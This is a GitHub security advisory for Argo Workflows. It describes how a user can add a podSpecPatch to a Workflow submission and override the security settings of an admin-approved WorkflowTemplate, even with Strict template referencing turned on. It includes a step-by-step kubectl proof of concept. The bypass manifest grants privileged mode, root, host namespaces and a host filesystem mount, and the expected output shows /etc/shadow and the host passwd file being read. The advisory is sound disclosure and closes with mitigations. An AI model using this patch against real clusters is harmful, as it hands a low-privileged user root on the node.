# [H] Argo Workflows: WorkflowTemplate Security Bypass via podSpecPatch in Strict/Secure Reference Mode

## Summary
Severity: High
Advisory: GHSA-3wf5-g532-rcrr
CVE: CVE-2026-31892
CWE: CWE-863
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2026-03-11
Source: https://github.com/advisories/GHSA-3wf5-g532-rcrr
Type: github-advisory

## Affected
- Go: `github.com/argoproj/argo-workflows/v4` — affected >=0 <4.0.2
- Go: `github.com/argoproj/argo-workflows/v3` — affected >=0 <3.7.11
- Go: `github.com/argoproj/argo-workflows` — affected >=2.9.0

## Details
## Summary

A user who can submit Workflows can completely bypass all security settings defined in a `WorkflowTemplate` by including a `podSpecPatch` field in their Workflow submission. This works even when the controller is configured with `templateReferencing: Strict`, which is specifically documented as a mechanism to restrict users to admin-approved templates. The `podSpecPatch` field on a submitted Workflow takes precedence over the referenced `WorkflowTemplate` during spec merging and is applied directly to the pod spec at creation time with no security validation.

## Details

Three issues combine to create this vulnerability:

1. Merge priority order:`JoinWorkflowSpec` merges specs with the priority order Workflow Spec > WorkflowTemplate Spec > WorkflowDefault Spec. Because `podSpecPatch` is a plain string field, the Workflow's value replaces the WorkflowTemplate's value.

2. No security validation on `podSpecPatch`: `ApplyPodSpecPatch()` only validates that the patch is syntactically valid JSON conforming to the Kubernetes `PodSpec` schema. No checks are performed for dangerous security settings such as `privileged: true`.

3. `templateReferencing: Strict` does not restrict `podSpecPatch`: Strict mode only checks whether `WorkflowTemplateRef` is set. If it is, the Workflow passes validation regardless of what other fields (including `podSpecPatch`) are present.

## PoC

### Prerequisites

A local Kubernetes cluster with Argo Workflows installed. The instructions below use [kind](https://kind.sigs.k8s.io/).

#### 1. Create a kind cluster and install Argo Workflows

```bash
kind create cluster --name argo-poc

kubectl create namespace argo
kubectl apply -n argo --server-side \
  -f https://github.com/argoproj/argo-workflows/releases/download/v4.0.1/install.yaml
```

Note: `--server-side` is required because some CRDs exceed the client-side annotation size limit.

Wait for the controller to be ready:

```bash
kubectl wait -n argo --for=condition=Ready pod -l app=workflow-controller --timeout=120s
```

#### 2. Enable `templateReferencing: Strict`

Patch the workflow controller configmap to enforce Strict mode:

```bash
kubectl patch configmap workflow-controller-configmap -n argo --type merge \
  -p '{"data":{"workflowRestrictions":"templateReferencing: Strict\n"}}'
```

Restart the controller to pick up the new config:

```bash
kubectl rollout restart deployment workflow-controller -n argo
kubectl wait -n argo --for=condition=Ready pod -l app=workflow-controller --timeout=120s
```

#### 3. Verify Strict mode is active

Attempt to submit a standalone Workflow (no `workflowTemplateRef`). It should be rejected:

```bash
cat <<'EOF' | kubectl create -n argo -f -
apiVersion: argoproj.io/v1alpha1
kind: Workflow
metadata:
  generateName: strict-test-
spec:
  entrypoint: test
  templates:
  - name: test
    container:
      image: alpine
      command: [echo, "hello"]
EOF
```

The Workflow will be accepted by the API server but the controller will reject it. After a few seconds, check its status:

```bash
STRICT_WF=$(kubectl get workflow -n argo -o name | grep strict-test | tail -1)
kubectl get -n argo "$STRICT_WF" -o jsonpath='{.status.phase} {.status.message}'
```

Expected output:

```
Error workflows must use workflowTemplateRef to be executed when the controller is in reference mode
```

#### 4: Create a hardened WorkflowTemplate

An administrator creates a `WorkflowTemplate` with restrictive security settings:

```bash
cat <<'EOF' | kubectl apply -n argo -f -
apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: secure-template
  namespace: argo
  annotations:
    description: "Admin-approved secure template with hardened security settings"
spec:
  entrypoint: secure-task
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 1000
  templates:
  - name: secure-task
    container:
      image: alpine:latest
      command: ["/bin/sh", "-c"]
      args:
        - |
          echo "=== Security Context Check ==="
          echo "Current UID: $(id -u)"
          echo "Current GID: $(id -g)"
          if cat /etc/shadow 2>/dev/null; then
            echo "EXPLOITED: Can read /etc/shadow!"
          else
            echo "SECURE: Cannot read /etc/shadow"
          fi
          if ls /host/etc/passwd 2>/dev/null; then
            echo "EXPLOITED: Host filesystem accessible!"
            cat /host/etc/passwd | head -5
          else
            echo "SECURE: No host filesystem access"
          fi
          if [ "$(id -u)" = "0" ]; then
            echo "EXPLOITED: Running as root!"
          else
            echo "SECURE: Running as non-root (UID: $(id -u))"
          fi
          echo "=== End Check ==="
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
        allowPrivilegeEscalation: false
        capabilities:
          drop:
            - ALL
EOF
```

#### 5. Submit a legitimate Workflow (baseline)

Submit a Workflow that references the secure template without modification:

```bash
cat <<'EOF' | kubectl create -n argo -f -
apiVersion: argoproj.io/v1alpha1
kind: Workflow
metadata:
  generateName: legit-use-
  namespace: argo
spec:
  workflowTemplateRef:
    name: secure-template
EOF
```

Wait for completion and check logs:

```bash
LEGIT_WF=$(kubectl get workflow -n argo -o name | grep legit-use | tail -1)
kubectl wait -n argo --for=condition=Completed "$LEGIT_WF" --timeout=120s
kubectl logs -n argo -l "workflows.argoproj.io/workflow=$(basename $LEGIT_WF)" -c main
```

Expected output (confirming the template's security settings are applied):

```
=== Security Context Check ===
Current UID: 1000
Current GID: 0
SECURE: Cannot read /etc/shadow
SECURE: No host filesystem access
SECURE: Running as non-root (UID: 1000)
=== End Check ===
```

#### 6. Submit the bypass Workflow

Submit a Workflow that references the same secure template but includes a `podSpecPatch` that overrides all security settings:

```bash
cat <<'EOF' | kubectl create -n argo -f -
apiVersion: argoproj.io/v1alpha1
kind: Workflow
metadata:
  generateName: bypass-security-
  namespace: argo
spec:
  workflowTemplateRef:
    name: secure-template
  podSpecPatch: |
    hostPID: true
    hostNetwork: true
    containers:
    - name: main
      securityContext:
        privileged: true
        runAsUser: 0
        runAsNonRoot: false
        allowPrivilegeEscalation: true
        capabilities:
          add:
            - ALL
          drop: []
      volumeMounts:
      - name: host-root
        mountPath: /host
    volumes:
    - name: host-root
      hostPath:
        path: /
        type: Directory
EOF
```

Wait for completion and check logs:

```bash
BYPASS_WF=$(kubectl get workflow -n argo -o name | grep bypass-security | tail -1)
kubectl wait -n argo --for=condition=Completed "$BYPASS_WF" --timeout=120s
kubectl logs -n argo -l "workflows.argoproj.io/workflow=$(basename $BYPASS_WF)" -c main
```

Expected output (all security settings bypassed):

```
=== Security Context Check ===
Current UID: 0
Current GID: 0
root:*::0:::::
bin:!::0:::::
[... /etc/shadow contents dumped ...]
EXPLOITED: Can read /etc/shadow!
EXPLOITED: Host filesystem accessible!
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
[... host /etc/passwd contents ...]
EXPLOITED: Running as root!
=== End Check ===
```

The file `/etc/shadow` is readable (root), the host filesystem is mounted and accessible, and the container runs as UID 0.

## Impact

The purpose of `templateReferencing: Strict` is to restrict users to only execute admin-approved `WorkflowTemplates`. This is explicitly [documented](https://argo-workflows.readthedocs.io/en/latest/security/) as a security feature:

> You can typically further restrict what a user can do to just being able to submit workflows from templates using the workflow restrictions feature.

A user who can submit Workflows referencing approved templates can use `podSpecPatch` to:

- Run containers as root (`runAsUser: 0`)
- Enable privileged mode (`privileged: true`)
- Mount the host filesystem (`hostPath` volumes)
- Share host PID/network/IPC namespaces (`hostPID`, `hostNetwork`, `hostIPC`)
- Add all Linux capabilities (`capabilities.add: ["ALL"]`)

This effectively grants the user full root access to the underlying Kubernetes node, regardless of what security constraints the admin configured in the `WorkflowTemplate`.

The `templateReferencing` feature was introduced in Argo Workflows v2.9.0 through PR #3149.

## Mitigation

When `templateReferencing: Strict` or `Secure` is enabled, the controller should reject Workflows that include a `podSpecPatch` field when using `workflowTemplateRef`.

Without the codefix, deploying an admission controller (OPA/Gatekeeper, Kyverno) with policies that block dangerous pod settings (`privileged`, `hostPID`, `hostNetwork`, `hostIPC`, `hostPath`) on pods created by Argo Workflows.

## References
- https://github.com/argoproj/argo-workflows/security/advisories/GHSA-3wf5-g532-rcrr
- https://nvd.nist.gov/vuln/detail/CVE-2026-31892
- https://github.com/argoproj/argo-workflows
